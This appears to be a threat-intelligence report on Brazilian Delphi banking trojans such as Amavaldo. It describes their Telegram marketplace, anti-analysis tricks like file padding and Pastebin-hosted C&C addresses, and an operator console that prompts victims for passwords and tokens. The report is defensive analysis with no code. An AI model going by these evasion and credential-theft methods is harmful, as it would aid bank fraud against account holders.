Among security researchers, Brazil has become known mainly for its trojans developed in
the Delphi language.
They are different trojan families with similar technical characteristics and objectives: stealing
data and sessions, establishing persistence and transferring money from victims’ bank
accounts through remote access.
Over the last few years, different names have been used to identify this type of malware.

A multidisciplinary cybercrime ecosystem offers specific capabilities and moves
immeasurable amounts of money.
The telegram network is considered the Brazilian darkweb and all the necessary services are
available in channels specialized in the respective themes.

KL Remota, a term used among threat actors, is the generic name of the Trojan source code
in Delphi and can be easily found in telegram channels at an approximate cost of $6,000
dollars, however, after payment there is no guarantee that the seller will actually share the
code, which makes it difficult to purchase this type of malware source code.

The weekly rental becomes an alternative with less risk and investment, for the approximate
amount of $600 dollars it is possible to rent an Server C&C operator interface with a limited
number of infects (Ex: 30) and start a small campaign.
KL Components
In December 2022 we collected samples from Amavaldo and observed the use of captcha as
a new technique added to avoid automated analysis.
Another well-known technique that has the same objective is the inclusion of multiple Bytes
at the end of the file so that its size is greater than that supported by platforms such as
VirusTotal and Any.Run

Still about on anti-debug techniques, we observed that the algorithm developed by Tom Lee
is used to decrypt a string collected from the Pastebin platform.
The string aims to reveal the IP address and Port of the Command-and-Control to which the
victim’s device must establish the reverse connection.

After running Amavaldo, it creates a process in the operating system, loads the DLL
NvSmartMax.dll into memory and, through the FindWindow function, starts monitoring the
active windows in the victim’s session in the background.
In its code there is a list of strings belonging to the financial institutions that will be triggers to
establish the connection with the attacker’s C&C after the user accesses the respective
websites.
The operator interface also offers server functionality, for each connected victim an audible
alert is issued, and the console displays hostname, financial institution name, IP address and
browser information.
KL Operator
While the victim browses the bank page, the attacker monitors his activities until the moment
he starts the interaction, then the victim will have the perception that protection modules are
being updated on his device, when in fact the attacker will be logged into his account
banking from your own computer and making transfers to other current accounts.
Among the options available on the operator console are:
Standby Mode
Request QR code
Request 6-digits password.
Request account password.
Request certificate password.
Request SMS token.
Request key.
Request electronic signature.
Restart the victim’s computer.
